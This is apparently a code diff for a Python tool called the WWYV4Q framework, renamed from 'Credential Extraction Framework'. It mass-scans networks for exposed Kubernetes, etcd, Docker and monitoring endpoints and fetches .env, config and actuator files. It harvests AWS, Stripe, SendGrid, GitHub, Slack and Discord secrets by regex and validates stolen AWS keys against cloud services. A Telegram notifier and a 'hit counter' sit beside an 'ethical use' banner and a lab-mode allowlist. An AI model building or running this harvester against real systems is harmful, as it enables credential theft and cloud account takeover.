@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-WWYV4Q Perfect Credential Extraction Framework
+WWYV4Q Perfect Kubernetes & Cloud Security Framework
 Author: wKayaa
 Date: 2025-06-23
-Version: 4.0
+Version: 5.0
 
 ⚠️ ETHICAL USE ONLY ⚠️
 This framework is designed for authorized penetration testing,
@@ -23,7 +23,6 @@ import re
 import ssl
 import subprocess
 import hashlib
-import redis
 import csv
 from datetime import datetime, timedelta
 from ipaddress import IPv4Network, IPv4Address
@@ -40,16 +39,22 @@ import yaml
 import boto3
 from botocore.exceptions import ClientError, NoCredentialsError
 import requests
-from urllib3.disable_warnings import disable_warnings
-from urllib3.exceptions import InsecureRequestWarning
 import concurrent.futures
 from threading import Lock
 import signal
 import psutil
 
-# Disable SSL warnings for testing environments
-disable_warnings(InsecureRequestWarning)
+# Fix urllib3 import
+try:
+    from urllib3.disable_warnings import disable_warnings
+    from urllib3.exceptions import InsecureRequestWarning
+    disable_warnings(InsecureRequestWarning)
+except ImportError:
+    # Fallback if urllib3 not available
+    import warnings
+    warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
+# Advanced configuration
 PERFECT_CONFIG = {
     "extraction": {
         "threads": 500,
@@ -57,8 +62,8 @@ PERFECT_CONFIG = {
         "max_retries": 3,
         "confidence_threshold": 0.7,
         "real_validation_enabled": True,
-        "mass_scan_enabled": True,
-        "advanced_patterns": True
+        "advanced_patterns": True,
+        "mass_scan_enabled": True
     },
     "notifications": {
         "telegram": {
@@ -72,21 +77,32 @@ PERFECT_CONFIG = {
             "hit_counter_start": 2769300
         }
     },
-    "target_generation": {
-        "cidr_ranges": [
-            "10.0.0.0/8",
-            "172.16.0.0/12", 
-            "192.168.0.0/16",
-            "169.254.0.0/16"
-        ],
-        "common_ports": [80, 443, 8080, 8443, 3000, 5000, 8000, 9000],
-        "cloud_ranges": True,
-        "subdomain_enumeration": True
+    "scanning": {
+        "port_scan_timeout": 3,
+        "max_concurrent_scans": 1000,
+        "service_detection": True,
+        "aggressive_mode": False
+    },
+    "aws": {
+        "region": "us-east-1",
+        "profile": None,
+        "instant_validation": True,
+        "service_enumeration": True
+    },
+    "output": {
+        "formats": ["json", "csv", "md"],
+        "directory": "./results/perfect_production/",
+        "real_time_logging": True,
+        "database_storage": False
+    },
+    "lab_mode": {
+        "enabled": True,
+        "allowed_networks": ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"]
     }
 }
 
 # ============================================================================
-# CORE FRAMEWORK CLASSES AND ENUMS
+# CORE FRAMEWORK CLASSES AND ENUMS  
 # ============================================================================
 
 class SeverityLevel(Enum):
@@ -97,19 +113,76 @@ class SeverityLevel(Enum):
     HIGH = "high"
     CRITICAL = "critical"
 
+class PhaseType(Enum):
+    """Framework execution phases"""
+    INFRASTRUCTURE_DETECTION = "infrastructure_detection"
+    CREDENTIAL_EXTRACTION = "credential_extraction"
+    KUBERNETES_EXPLOITATION = "kubernetes_exploitation"
+    EKS_POD_IDENTITY = "eks_pod_identity"
+    ORCHESTRATION = "orchestration"
+
 class ServiceType(Enum):
     """Types of services detected"""
+    KUBERNETES_API = "kubernetes_api"
+    KUBELET = "kubelet"
+    ETCD = "etcd"
+    DOCKER_API = "docker_api"
+    ENVOY_ADMIN = "envoy_admin"
+    PROMETHEUS = "prometheus"
+    GRAFANA = "grafana"
     AWS = "aws"
     AZURE = "azure"
     GCP = "gcp"
-    KUBERNETES = "kubernetes"
-    DOCKER = "docker"
     SENDGRID = "sendgrid"
     MAILGUN = "mailgun"
     STRIPE = "stripe"
     GITHUB = "github"
     GITLAB = "gitlab"
+    REDIS = "redis"
+    ELASTICSEARCH = "elasticsearch"
+    JENKINS = "jenkins"
     UNKNOWN = "unknown"
+
+@dataclass
+class Target:
+    """Target representation"""
+    host: str
+    port: int
+    protocol: str = "tcp"
+    service: ServiceType = ServiceType.UNKNOWN
+    metadata: Dict[str, Any] = field(default_factory=dict)
+    
+    def __str__(self):
+        return f"{self.host}:{self.port}/{self.service.value}"
+
+@dataclass
+class Finding:
+    """Standardized finding structure"""
+    id: str
+    timestamp: str
+    target: str
+    service: str
+    phase: str
+    vulnerability: str
+    severity: SeverityLevel
+    description: str
+    evidence: Dict[str, Any]
+    remediation: str
+    cvss_score: float = 0.0
+    references: List[str] = field(default_factory=list)
+    
+    def to_dict(self):
+        result = asdict(self)
+        result['severity'] = self.severity.value
+        return result
+    
+    def to_csv_row(self):
+        return [
+            self.id, self.timestamp, self.target, self.service,
+            self.phase, self.vulnerability, self.severity.value,
+            self.description, json.dumps(self.evidence),
+            self.remediation, self.cvss_score
+        ]
 
 @dataclass
 class PerfectExtractedCredential:
@@ -134,21 +207,645 @@ class PerfectExtractedCredential:
     region: Optional[str] = "us-east-1"
 
 @dataclass
-class Target:
-    """Target representation"""
-    host: str
-    port: int
-    protocol: str = "https"
-    path: str = "/"
-    service_type: Optional[ServiceType] = None
-    metadata: Dict[str, Any] = field(default_factory=dict)
-
-class PerfectCredentialExtractor:
-    """Perfect credential extractor with advanced patterns"""
+class FrameworkConfig:
+    """Global framework configuration"""
+    # Network settings
+    thread_count: int = 500
+    timeout: int = 30
+    user_agent: str = "WWYV4Q-Framework/5.0"
+    max_retries: int = 3
     
-    def __init__(self, config: Dict[str, Any]):
+    # Output settings
+    output_dir: str = "./results"
+    log_level: str = "INFO"
+    save_json: bool = True
+    save_csv: bool = True
+    save_markdown: bool = True
+    
+    # AWS settings
+    aws_region: str = "us-east-1"
+    aws_profile: Optional[str] = None
+    
+    # Scanning settings
+    port_scan_timeout: int = 3
+    max_concurrent_scans: int = 1000
+    
+    # Lab environment settings
+    lab_mode: bool = True
+    allowed_networks: List[str] = field(default_factory=lambda: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
+
+# ============================================================================
+# BASE CLASSES
+# ============================================================================
+
+class BaseModule(ABC):
+    """Base class for all modules"""
+    
+    def __init__(self, config: FrameworkConfig):
         self.config = config
-        self.logger = logging.getLogger(f"{__name__}.PerfectCredentialExtractor")
+        self.findings: List[Finding] = []
+        self.logger = self._setup_logger()
+        self.session_timeout = aiohttp.ClientTimeout(total=config.timeout)
+        self._finding_lock = Lock()
+        self._finding_counter = 0
+    
+    def _setup_logger(self):
+        logger = logging.getLogger(self.__class__.__name__)
+        logger.setLevel(getattr(logging, self.config.log_level))
+        
+        if not logger.handlers:
+            handler = logging.StreamHandler()
+            formatter = logging.Formatter(
+                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+            )
+            handler.setFormatter(formatter)
+            logger.addHandler(handler)
+        
+        return logger
+    
+    @abstractmethod
+    async def execute(self, targets: Union[List[str], List[Target]]) -> List[Finding]:
+        """Main execution method"""
+        pass
+    
+    def add_finding(self, **kwargs):
+        """Add a standardized finding with thread safety"""
+        with self._finding_lock:
+            self._finding_counter += 1
+            finding_id = f"{self.__class__.__name__}_{self._finding_counter}_{int(time.time())}"
+        
+        finding = Finding(
+            id=finding_id,
+            timestamp=datetime.utcnow().isoformat(),
+            **kwargs
+        )
+        self.findings.append(finding)
+        self.logger.info(f"Finding [{finding.severity.value.upper()}]: {finding.vulnerability} on {finding.target}")
+        return finding
+    
+    def _is_target_allowed(self, target: str) -> bool:
+        """Check if target is in allowed networks (lab mode)"""
+        if not self.config.lab_mode:
+            return True
+        
+        try:
+            target_ip = IPv4Address(target)
+            for network in self.config.allowed_networks:
+                if target_ip in IPv4Network(network):
+                    return True
+            return False
+        except Exception:
+            return False
+
+# ============================================================================
+# PHASE 1 - INFRASTRUCTURE DETECTION
+# ============================================================================
+
+class InfrastructureScanner(BaseModule):
+    """Infrastructure scanner for detecting services"""
+    
+    def __init__(self, config: FrameworkConfig):
+        super().__init__(config)
+        self.service_ports = {
+            # Kubernetes core services
+            6443: ServiceType.KUBERNETES_API,    # API Server
+            8080: ServiceType.KUBERNETES_API,    # API Server insecure
+            8001: ServiceType.KUBERNETES_API,    # kubectl proxy
+            10250: ServiceType.KUBELET,          # Kubelet API
+            10255: ServiceType.KUBELET,          # Kubelet read-only
+            10256: ServiceType.KUBELET,          # kube-proxy health
+            
+            # etcd
+            2379: ServiceType.ETCD,              # etcd client
+            2380: ServiceType.ETCD,              # etcd peer
+            
+            # Docker
+            2375: ServiceType.DOCKER_API,        # Docker API insecure
+            2376: ServiceType.DOCKER_API,        # Docker API TLS
+            
+            # Monitoring & observability
+            9090: ServiceType.PROMETHEUS,        # Prometheus
+            3000: ServiceType.GRAFANA,           # Grafana
+            9901: ServiceType.ENVOY_ADMIN,       # Envoy admin
+            15000: ServiceType.ENVOY_ADMIN,      # Envoy admin alt
+            15001: ServiceType.ENVOY_ADMIN,      # Envoy admin alt
+            
+            # Additional services
+            6379: ServiceType.REDIS,             # Redis
+            9200: ServiceType.ELASTICSEARCH,     # Elasticsearch
+            8080: ServiceType.JENKINS,           # Jenkins (alt)
+            80: ServiceType.UNKNOWN,             # HTTP
+            443: ServiceType.UNKNOWN,            # HTTPS
+            8443: ServiceType.UNKNOWN,           # HTTPS alt
+            5000: ServiceType.UNKNOWN,           # Common app port
+            8000: ServiceType.UNKNOWN,           # Common app port
+            9000: ServiceType.UNKNOWN,           # Common app port
+        }
+    
+    async def execute(self, targets: List[str]) -> List[Finding]:
+        """Execute infrastructure scanning"""
+        self.logger.info(f"🔍 Starting infrastructure scan on {len(targets)} targets")
+        
+        all_targets = []
+        for target in targets:
+            if '/' in target:  # CIDR notation
+                all_targets.extend(self._expand_cidr_targets(target))
+            else:
+                all_targets.append(target)
+        
+        # Filter allowed targets
+        allowed_targets = [t for t in all_targets if self._is_target_allowed(t)]
+        self.logger.info(f"🎯 Scanning {len(allowed_targets)} allowed targets")
+        
+        # Scan in parallel with concurrency limiting
+        semaphore = asyncio.Semaphore(self.config.max_concurrent_scans)
+        tasks = [self._scan_target_with_semaphore(semaphore, target) for target in allowed_targets]
+        
+        await asyncio.gather(*tasks, return_exceptions=True)
+        return self.findings
+    
+    def _expand_cidr_targets(self, cidr: str) -> List[str]:
+        """Expand CIDR ranges to individual IPs"""
+        try:
+            network = IPv4Network(cidr, strict=False)
+            return [str(ip) for ip in network.hosts()]
+        except Exception as e:
+            self.logger.error(f"Invalid CIDR {cidr}: {e}")
+            return []
+    
+    async def _scan_target_with_semaphore(self, semaphore, target):
+        """Scan with semaphore for concurrency limiting"""
+        async with semaphore:
+            await self._scan_target(target)
+    
+    async def _scan_target(self, target: str):
+        """Scan a specific target"""
+        try:
+            # Fast port scan
+            open_ports = await self._port_scan(target, list(self.service_ports.keys()))
+            
+            if not open_ports:
+                return
+            
+            self.logger.info(f"🎯 Found {len(open_ports)} open ports on {target}")
+            
+            # Service identification
+            for port in open_ports:
+                service_type = self.service_ports.get(port, ServiceType.UNKNOWN)
+                service_info = await self._identify_service(target, port)
+                
+                severity = self._assess_severity(service_type, port, service_info)
+                
+                self.add_finding(
+                    target=f"{target}:{port}",
+                    service=service_type.value,
+                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                    vulnerability=f"Exposed {service_type.value} service",
+                    severity=severity,
+                    description=f"{service_type.value} service detected on {target}:{port}",
+                    evidence={
+                        "port": port,
+                        "service_type": service_type.value,
+                        "service_info": service_info,
+                        "host": target
+                    },
+                    remediation=self._get_remediation(service_type, port)
+                )
+                
+                # Deep service enumeration
+                await self._enumerate_service(target, port, service_type)
+                
+        except Exception as e:
+            self.logger.error(f"Error scanning {target}: {e}")
+    
+    async def _port_scan(self, target: str, ports: List[int]) -> List[int]:
+        """Optimized async port scanning"""
+        open_ports = []
+        timeout = self.config.port_scan_timeout
+        
+        async def check_port(port):
+            try:
+                future = asyncio.open_connection(target, port)
+                reader, writer = await asyncio.wait_for(future, timeout=timeout)
+                writer.close()
+                try:
+                    await writer.wait_closed()
+                except:
+                    pass
+                return port
+            except:
+                return None
+        
+        # Limit concurrency to avoid resource exhaustion
+        semaphore = asyncio.Semaphore(min(100, len(ports)))
+        
+        async def check_port_with_semaphore(port):
+            async with semaphore:
+                return await check_port(port)
+        
+        tasks = [check_port_with_semaphore(port) for port in ports]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        return [port for port in results if port is not None and not isinstance(port, Exception)]
+    
+    async def _identify_service(self, target: str, port: int) -> Dict[str, Any]:
+        """Detailed service identification"""
+        service_info = {
+            "version": None,
+            "headers": {},
+            "banner": None,
+            "ssl_info": {},
+            "endpoints": []
+        }
+        
+        # Try HTTP banner grabbing
+        for protocol in ['https', 'http']:
+            try:
+                connector = aiohttp.TCPConnector(ssl=False)
+                async with aiohttp.ClientSession(
+                    connector=connector,
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as session:
+                    url = f"{protocol}://{target}:{port}/"
+                    async with session.get(url) as response:
+                        service_info["headers"] = dict(response.headers)
+                        service_info["status_code"] = response.status
+                        
+                        # Try to get content for service identification
+                        try:
+                            content = await response.text()
+                            service_info["content_sample"] = content[:500]
+                        except:
+                            pass
+                        
+                        break
+            except:
+                continue
+        
+        # Try raw TCP banner grabbing
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(target, port), timeout=3
+            )
+            
+            # Send simple HTTP request
+            writer.write(b"GET / HTTP/1.0\r\n\r\n")
+            await writer.drain()
+            
+            banner = await asyncio.wait_for(reader.read(1024), timeout=2)
+            service_info["banner"] = banner.decode('utf-8', errors='ignore')
+            
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except:
+                pass
+                
+        except:
+            pass
+        
+        return service_info
+    
+    async def _enumerate_service(self, target: str, port: int, service_type: ServiceType):
+        """Deep service enumeration"""
+        if service_type == ServiceType.KUBERNETES_API:
+            await self._enumerate_kubernetes_api(target, port)
+        elif service_type == ServiceType.KUBELET:
+            await self._enumerate_kubelet(target, port)
+        elif service_type == ServiceType.DOCKER_API:
+            await self._enumerate_docker_api(target, port)
+        elif service_type == ServiceType.ETCD:
+            await self._enumerate_etcd(target, port)
+        elif service_type == ServiceType.ENVOY_ADMIN:
+            await self._enumerate_envoy(target, port)
+        elif service_type == ServiceType.PROMETHEUS:
+            await self._enumerate_prometheus(target, port)
+        elif service_type == ServiceType.GRAFANA:
+            await self._enumerate_grafana(target, port)
+    
+    async def _enumerate_kubernetes_api(self, target: str, port: int):
+        """Enumerate Kubernetes API"""
+        endpoints = [
+            "/api/v1",
+            "/version",
+            "/healthz",
+            "/metrics",
+            "/openapi/v2",
+            "/api/v1/namespaces",
+            "/api/v1/nodes",
+            "/api/v1/pods",
+            "/api/v1/secrets",
+            "/api/v1/configmaps"
+        ]
+        
+        for protocol in ['https', 'http']:
+            base_url = f"{protocol}://{target}:{port}"
+            
+            async with aiohttp.ClientSession(
+                connector=aiohttp.TCPConnector(ssl=False),
+                timeout=self.session_timeout
+            ) as session:
+                
+                for endpoint in endpoints:
+                    try:
+                        async with session.get(f"{base_url}{endpoint}") as response:
+                            if response.status == 200:
+                                self.add_finding(
+                                    target=f"{target}:{port}",
+                                    service="kubernetes_api_endpoint",
+                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                    vulnerability="Accessible Kubernetes API endpoint",
+                                    severity=SeverityLevel.INFO if endpoint in ["/version", "/healthz"] else SeverityLevel.MEDIUM,
+                                    description=f"Accessible endpoint: {endpoint}",
+                                    evidence={
+                                        "endpoint": endpoint,
+                                        "status_code": response.status,
+                                        "url": f"{base_url}{endpoint}"
+                                    },
+                                    remediation="Review API access controls and authentication"
+                                )
+                            elif response.status == 401:
+                                self.add_finding(
+                                    target=f"{target}:{port}",
+                                    service="kubernetes_api_endpoint",
+                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                    vulnerability="Kubernetes API endpoint requires authentication",
+                                    severity=SeverityLevel.INFO,
+                                    description=f"Endpoint {endpoint} requires authentication",
+                                    evidence={
+                                        "endpoint": endpoint,
+                                        "status_code": response.status,
+                                        "url": f"{base_url}{endpoint}"
+                                    },
+                                    remediation="Ensure proper authentication is configured"
+                                )
+                    except Exception as e:
+                        self.logger.debug(f"Error accessing {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_kubelet(self, target: str, port: int):
+        """Enumerate Kubelet endpoints"""
+        endpoints = [
+            "/pods",
+            "/metrics",
+            "/logs",
+            "/stats",
+            "/spec",
+            "/healthz",
+            "/metrics/cadvisor",
+            "/metrics/probes",
+            "/runningpods"
+        ]
+        
+        for protocol in ['https', 'http']:
+            base_url = f"{protocol}://{target}:{port}"
+            
+            async with aiohttp.ClientSession(
+                connector=aiohttp.TCPConnector(ssl=False),
+                timeout=self.session_timeout
+            ) as session:
+                
+                for endpoint in endpoints:
+                    try:
+                        async with session.get(f"{base_url}{endpoint}") as response:
+                            if response.status == 200:
+                                content_length = len(await response.text())
+                                
+                                severity = SeverityLevel.HIGH if endpoint in ["/pods", "/logs"] else SeverityLevel.MEDIUM
+                                
+                                self.add_finding(
+                                    target=f"{target}:{port}",
+                                    service="kubelet_endpoint",
+                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                    vulnerability="Accessible Kubelet endpoint",
+                                    severity=severity,
+                                    description=f"Accessible Kubelet endpoint: {endpoint}",
+                                    evidence={
+                                        "endpoint": endpoint,
+                                        "content_length": content_length,
+                                        "url": f"{base_url}{endpoint}"
+                                    },
+                                    remediation="Secure Kubelet API with proper authentication and authorization"
+                                )
+                    except Exception as e:
+                        self.logger.debug(f"Error accessing Kubelet {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_docker_api(self, target: str, port: int):
+        """Enumerate Docker API"""
+        endpoints = [
+            "/version",
+            "/info",
+            "/containers/json",
+            "/images/json",
+            "/networks",
+            "/volumes",
+            "/system/df"
+        ]
+        
+        protocol = "https" if port == 2376 else "http"
+        base_url = f"{protocol}://{target}:{port}"
+        
+        async with aiohttp.ClientSession(
+            connector=aiohttp.TCPConnector(ssl=False),
+            timeout=self.session_timeout
+        ) as session:
+            
+            for endpoint in endpoints:
+                try:
+                    async with session.get(f"{base_url}{endpoint}") as response:
+                        if response.status == 200:
+                            severity = SeverityLevel.CRITICAL if endpoint in ["/containers/json", "/images/json"] else SeverityLevel.HIGH
+                            
+                            self.add_finding(
+                                target=f"{target}:{port}",
+                                service="docker_api_endpoint",
+                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                vulnerability="Accessible Docker API endpoint",
+                                severity=severity,
+                                description=f"Accessible Docker API endpoint: {endpoint}",
+                                evidence={
+                                    "endpoint": endpoint,
+                                    "url": f"{base_url}{endpoint}",
+                                    "secured": port == 2376
+                                },
+                                remediation="Secure Docker API with TLS authentication and proper access controls"
+                            )
+                except Exception as e:
+                    self.logger.debug(f"Error accessing Docker API {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_etcd(self, target: str, port: int):
+        """Enumerate etcd"""
+        endpoints = [
+            "/version",
+            "/health",
+            "/v2/keys",
+            "/v3/kv/range"
+        ]
+        
+        for protocol in ['https', 'http']:
+            base_url = f"{protocol}://{target}:{port}"
+            
+            async with aiohttp.ClientSession(
+                connector=aiohttp.TCPConnector(ssl=False),
+                timeout=self.session_timeout
+            ) as session:
+                
+                for endpoint in endpoints:
+                    try:
+                        async with session.get(f"{base_url}{endpoint}") as response:
+                            if response.status == 200:
+                                self.add_finding(
+                                    target=f"{target}:{port}",
+                                    service="etcd_endpoint",
+                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                    vulnerability="Accessible etcd endpoint",
+                                    severity=SeverityLevel.CRITICAL,
+                                    description=f"Accessible etcd endpoint: {endpoint}",
+                                    evidence={
+                                        "endpoint": endpoint,
+                                        "url": f"{base_url}{endpoint}"
+                                    },
+                                    remediation="Secure etcd with proper authentication and network isolation"
+                                )
+                    except Exception as e:
+                        self.logger.debug(f"Error accessing etcd {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_envoy(self, target: str, port: int):
+        """Enumerate Envoy Admin"""
+        endpoints = [
+            "/",
+            "/stats",
+            "/clusters",
+            "/config_dump",
+            "/listeners",
+            "/server_info"
+        ]
+        
+        base_url = f"http://{target}:{port}"
+        
+        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
+            for endpoint in endpoints:
+                try:
+                    async with session.get(f"{base_url}{endpoint}") as response:
+                        if response.status == 200:
+                            self.add_finding(
+                                target=f"{target}:{port}",
+                                service="envoy_admin_endpoint",
+                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                vulnerability="Accessible Envoy admin endpoint",
+                                severity=SeverityLevel.HIGH,
+                                description=f"Accessible Envoy admin endpoint: {endpoint}",
+                                evidence={
+                                    "endpoint": endpoint,
+                                    "url": f"{base_url}{endpoint}"
+                                },
+                                remediation="Disable Envoy admin interface or restrict access"
+                            )
+                except Exception as e:
+                    self.logger.debug(f"Error accessing Envoy {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_prometheus(self, target: str, port: int):
+        """Enumerate Prometheus"""
+        endpoints = [
+            "/",
+            "/metrics",
+            "/targets",
+            "/api/v1/query",
+            "/api/v1/label/__name__/values"
+        ]
+        
+        base_url = f"http://{target}:{port}"
+        
+        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
+            for endpoint in endpoints:
+                try:
+                    async with session.get(f"{base_url}{endpoint}") as response:
+                        if response.status == 200:
+                            self.add_finding(
+                                target=f"{target}:{port}",
+                                service="prometheus_endpoint",
+                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                vulnerability="Accessible Prometheus endpoint",
+                                severity=SeverityLevel.MEDIUM,
+                                description=f"Accessible Prometheus endpoint: {endpoint}",
+                                evidence={
+                                    "endpoint": endpoint,
+                                    "url": f"{base_url}{endpoint}"
+                                },
+                                remediation="Configure authentication and restrict metrics exposure"
+                            )
+                except Exception as e:
+                    self.logger.debug(f"Error accessing Prometheus {endpoint} on {target}:{port}: {e}")
+    
+    async def _enumerate_grafana(self, target: str, port: int):
+        """Enumerate Grafana"""
+        endpoints = [
+            "/",
+            "/login",
+            "/api/health",
+            "/api/datasources",
+            "/api/dashboards/home"
+        ]
+        
+        base_url = f"http://{target}:{port}"
+        
+        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
+            for endpoint in endpoints:
+                try:
+                    async with session.get(f"{base_url}{endpoint}") as response:
+                        if response.status == 200:
+                            self.add_finding(
+                                target=f"{target}:{port}",
+                                service="grafana_endpoint",
+                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
+                                vulnerability="Accessible Grafana endpoint",
+                                severity=SeverityLevel.MEDIUM,
+                                description=f"Accessible Grafana endpoint: {endpoint}",
+                                evidence={
+                                    "endpoint": endpoint,
+                                    "url": f"{base_url}{endpoint}"
+                                },
+                                remediation="Configure proper authentication and access controls"
+                            )
+                except Exception as e:
+                    self.logger.debug(f"Error accessing Grafana {endpoint} on {target}:{port}: {e}")
+    
+    def _assess_severity(self, service_type: ServiceType, port: int, service_info: Dict) -> SeverityLevel:
+        """Assess vulnerability severity"""
+        critical_services = [ServiceType.ETCD, ServiceType.DOCKER_API]
+        high_services = [ServiceType.KUBERNETES_API, ServiceType.KUBELET, ServiceType.ENVOY_ADMIN]
+        
+        if service_type in critical_services:
+            return SeverityLevel.CRITICAL
+        elif service_type in high_services:
+            return SeverityLevel.HIGH
+        elif port in [2375]:  # Docker API insecure
+            return SeverityLevel.CRITICAL
+        else:
+            return SeverityLevel.MEDIUM
+    
+    def _get_remediation(self, service_type: ServiceType, port: int) -> str:
+        """Get remediation recommendations"""
+        remediations = {
+            ServiceType.KUBERNETES_API: "Configure proper RBAC, enable authentication, and use network policies",
+            ServiceType.KUBELET: "Enable Kubelet authentication and authorization, restrict network access",
+            ServiceType.ETCD: "Enable etcd authentication, use TLS, and restrict network access",
+            ServiceType.DOCKER_API: "Enable TLS authentication for Docker API, restrict network access",
+            ServiceType.ENVOY_ADMIN: "Disable admin interface or restrict to localhost only",
+            ServiceType.PROMETHEUS: "Configure authentication and restrict metrics exposure",
+            ServiceType.GRAFANA: "Configure proper authentication and access controls"
+        }
+        
+        return remediations.get(service_type, "Review service configuration and access controls")
+
+# ============================================================================
+# PHASE 2 - CREDENTIAL EXTRACTION
+# ============================================================================
+
+class PerfectCredentialExtractor(BaseModule):
+    """Advanced credential extractor with comprehensive patterns"""
+    
+    def __init__(self, config: FrameworkConfig):
+        super().__init__(config)
         
         # Advanced credential patterns
         self.perfect_patterns = {
@@ -189,6 +886,16 @@ class PerfectCredentialExtractor:
                     r'ghr_[A-Za-z0-9]{36}',
                 ]
             },
+            'slack': {
+                'token': [
+                    r'xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}',
+                ]
+            },
+            'discord': {
+                'token': [
+                    r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
+                ]
+            },
             'jwt': {
                 'token': [
                     r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+',
@@ -203,12 +910,22 @@ class PerfectCredentialExtractor:
             }
         }
         
+        # Sensitive environment variables
+        self.sensitive_env_vars = [
+            'password', 'secret', 'token', 'key', 'credential',
+            'aws_access_key', 'aws_secret_key', 'api_key',
+            'database_url', 'db_password', 'redis_password',
+            'mysql_password', 'postgres_password', 'mongodb_uri',
+            'smtp_password', 'mail_password', 'email_password'
+        ]
+        
         # Common endpoints to check
         self.common_endpoints = [
             '/.env',
             '/.env.local',
             '/.env.production',
             '/.env.dev',
+            '/.env.staging',
             '/config.json',
             '/config.yml',
             '/config.yaml',
@@ -255,36 +972,62 @@ class PerfectCredentialExtractor:
             '/health',
             '/status',
             '/metrics',
-            '/debug'
+            '/debug',
+            '/actuator',
+            '/actuator/env',
+            '/actuator/configprops'
         ]
-
-    async def extract_from_target(self, target: Target) -> List[PerfectExtractedCredential]:
-        """Extract credentials from a target"""
-        credentials = []
         
-        self.logger.info(f"🔍 Extracting from {target.protocol}://{target.host}:{target.port}")
+        # Initialize extracted credentials storage
+        self.extracted_credentials: List[PerfectExtractedCredential] = []
+    
+    async def execute(self, targets: List[Target]) -> List[Finding]:
+        """Execute credential extraction"""
+        self.logger.info(f"🔍 Starting credential extraction on {len(targets)} targets")
+        
+        tasks = []
+        for target in targets:
+            if isinstance(target, str):
+                # Convert string to Target if needed
+                host, port = target.split(':') if ':' in target else (target, 80)
+                target = Target(host=host, port=int(port), service=ServiceType.UNKNOWN)
+            
+            if not self._is_target_allowed(target.host):
+                continue
+            
+            tasks.append(self._extract_from_target(target))
+        
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Convert extracted credentials to findings
+        await self._convert_credentials_to_findings()
+        
+        return self.findings
+    
+    async def _extract_from_target(self, target: Target):
+        """Extract credentials from a target"""
+        self.logger.info(f"🎯 PERFECT EXTRACTION: {target.host}:{target.port}")
         
         # Try different endpoints
         for endpoint in self.common_endpoints:
             try:
-                url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
-                extracted = await self._extract_from_url(url, target)
-                credentials.extend(extracted)
+                for protocol in ['https', 'http']:
+                    url = f"{protocol}://{target.host}:{target.port}{endpoint}"
+                    extracted = await self._extract_from_url(url, target)
+                    self.extracted_credentials.extend(extracted)
                 
                 # Rate limiting
                 await asyncio.sleep(0.1)
                 
             except Exception as e:
                 self.logger.debug(f"Error extracting from {endpoint}: {e}")
-        
-        return credentials
     
     async def _extract_from_url(self, url: str, target: Target) -> List[PerfectExtractedCredential]:
         """Extract credentials from a specific URL"""
         credentials = []
         
         try:
-            timeout = aiohttp.ClientTimeout(total=self.config["extraction"]["timeout"])
+            timeout = aiohttp.ClientTimeout(total=self.config.timeout)
             
             async with aiohttp.ClientSession(
                 timeout=timeout,
@@ -302,7 +1045,8 @@ class PerfectCredentialExtractor:
                         )
                         credentials.extend(extracted)
                         
-                        self.logger.info(f"✅ Found {len(extracted)} credentials in {url}")
+                        if extracted:
+                            self.logger.info(f"🎯 PERFECT EXTRACTION: {url} - {len(extracted)} credentials")
                         
         except Exception as e:
             self.logger.debug(f"Error fetching {url}: {e}")
@@ -395,6 +1139,38 @@ class PerfectCredentialExtractor:
                 base_score = 0.95
         
         return min(base_score, 1.0)
+    
+    async def _convert_credentials_to_findings(self):
+        """Convert extracted credentials to findings"""
+        for credential in self.extracted_credentials:
+            severity = SeverityLevel.HIGH
+            if credential.service_type == "aws" and credential.access_key and credential.secret_key:
+                severity = SeverityLevel.CRITICAL
+            elif credential.service_type in ["stripe", "sendgrid"]:
+                severity = SeverityLevel.HIGH
+            
+            self.add_finding(
+                target=credential.source_url,
+                service=f"{credential.service_type}_credentials",
+                phase=PhaseType.CREDENTIAL_EXTRACTION.value,
+                vulnerability=f"{credential.service_type.upper()} credentials exposed",
+                severity=severity,
+                description=f"Found {credential.service_type} credentials in exposed endpoint",
+                evidence={
+                    "service_type": credential.service_type,
+                    "access_key": credential.access_key[:10] + "..." if credential.access_key else None,
+                    "has_secret": bool(credential.secret_key),
+                    "api_key": credential.api_key[:10] + "..." if credential.api_key else None,
+                    "token": credential.token[:20] + "..." if credential.token else None,
+                    "confidence_score": credential.confidence_score,
+                    "source_endpoint": credential.source_endpoint
+                },
+                remediation="Remove exposed credentials and rotate compromised keys immediately"
+            )
+
+# ============================================================================
+# AWS VALIDATOR WITH INSTANT CHECKING
+# ============================================================================
 
 class AWSValidator:
     """AWS credential validator with EKS/SES/SNS access checking"""
@@ -450,6 +1226,8 @@ class AWSValidator:
                 self._check_ec2_scaling(session, validation_result),
                 self._check_s3_access(session, validation_result),
                 self._check_iam_access(session, validation_result),
+                self._check_lambda_access(session, validation_result),
+                self._check_rds_access(session, validation_result),
                 return_exceptions=True
             )
             
